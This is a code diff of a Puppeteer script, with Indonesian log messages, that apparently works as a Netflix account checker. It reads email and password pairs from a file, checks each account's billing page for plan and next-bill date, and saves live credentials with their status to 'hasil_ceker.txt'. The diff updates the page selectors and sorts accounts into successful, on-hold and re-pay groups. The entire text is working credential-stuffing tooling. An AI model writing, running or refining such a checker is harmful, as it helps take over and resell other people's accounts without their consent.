@@ -34,22 +34,32 @@ const filemu = "akun.txt";
         await page.goto("https://www.netflix.com/BillingActivity")
         console.log("[+] Sedang Mengecek plan ...")
         try {
-            if (await page.waitForSelector("#appMountPoint > div > div > div.uma", {timeout:1000})) {
-                    let yourplan = await page.$eval('#appMountPoint > div > div > div.uma > div > article > section > h2', el => el.innerText);
-                    let nextbill = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(5)', el => el.innerText);
-                    console.log(`[+] Sorry, ${yourplan} nextbill ${nextbill}`)
-                    await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"|"+nextbill+"\n", "utf-8");
-            console.log('[+] Menyimpan data\n\n')
-            await browser.close()
-            }
-        } catch (err) {
-            await page.goto("https://www.netflix.com/BillingActivity")
-            let yourplan = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(2) > span', el => el.innerText);
-            let nextbill = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(5)', el => el.innerText);
-            console.log(`[+] Sukses, Yourplan is ${yourplan} nextbill ${nextbill}`)
+            await page.waitForSelector("#appMountPoint > div > div > div.bd > div > div > section:nth-child(2) > div > div", {visible:true, timeout:1000})
+            let yourplan = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section:nth-child(2) > div > div > div.gift-credit-content-headline', el => el.innerText);
+            let nextbill = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section:nth-child(2) > div > div > div:nth-child(2)', el => el.innerText);
+            console.log(`[+] Sukses, ${yourplan} & ${nextbill}`)
             await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"|"+nextbill+"\n", "utf-8");
             console.log('[+] Menyimpan data\n\n')
             await browser.close()
+            break
+        } catch (err) {
+            try { 
+                await page.waitForSelector("#appMountPoint > div > div > div.uma", {visible:true, timeout:1000})
+                let yourplan = await page.$eval('#appMountPoint > div > div > div.uma > div > article > section > h2', el => el.innerText);
+                let nextbill = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(5)', el => el.innerText);
+                console.log(`[-] On hold, ${yourplan} nextbill ${nextbill}`)
+                await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"|"+nextbill+"\n", "utf-8");
+                console.log('[+] Menyimpan data\n\n')
+                await browser.close()
+            } catch (err) {
+                await page.goto("https://www.netflix.com/BillingActivity")
+                let yourplan = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(2) > span', el => el.innerText);
+                let nextbill = await page.$eval('#appMountPoint > div > div > div.bd > div > div > section > div > div:nth-child(5)', el => el.innerText);
+                console.log(`[+] Sukses, Yourplan is ${yourplan} nextbill ${nextbill}`)
+                await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"|"+nextbill+"\n", "utf-8");
+                console.log('[+] Menyimpan data\n\n')
+                await browser.close()
+            }
         }
         continue
     } else if (await page.url().indexOf("signup") > -1) { 
@@ -58,7 +68,7 @@ const filemu = "akun.txt";
         console.log("[+] Sedang Mengecek plan ...")
         await page.waitForSelector("#appMountPoint > div > div > div.bd > div > div > div.account-messages-container > div > div.ui-message-contents", {delay: 300});
         let yourplan = await page.$eval('#appMountPoint > div > div > div.bd > div > div > div.account-messages-container > div > div.ui-message-contents', el => el.innerText);
-        console.log(`[-] Sorry, ${yourplan}`)
+        console.log(`[-] Re-pay, ${yourplan}`)
         await fsa.appendFile("hasil_ceker.txt", email+"|"+pass+"|"+yourplan+"\n", "utf-8");
         console.log('[+] Menyimpan data\n\n')
         await browser.close()
